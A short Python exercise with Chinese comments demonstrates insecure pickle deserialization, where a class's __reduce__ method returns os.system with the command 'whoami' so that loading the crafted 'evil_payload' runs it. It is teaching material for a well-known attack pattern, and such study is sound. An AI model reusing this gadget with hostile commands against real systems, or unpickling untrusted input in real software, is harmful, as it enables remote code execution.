### 习题3 实战复盘：反序列化__reduce__漏洞核心演示
import pickle
import os

# 核心知识点：__reduce__ 可自定义对象还原执行的函数
class Exp:
    # 漏洞关键魔术方法，反序列化自动触发
    def __reduce__(self):
        # 返回可执行系统命令的函数及参数
        return (os.system, ("whoami",))

# 构造恶意序列化payload
evil_payload = pickle.dumps(Exp())
# 反序列化触发命令执行（漏洞完整复现）
pickle.loads(evil_payload)
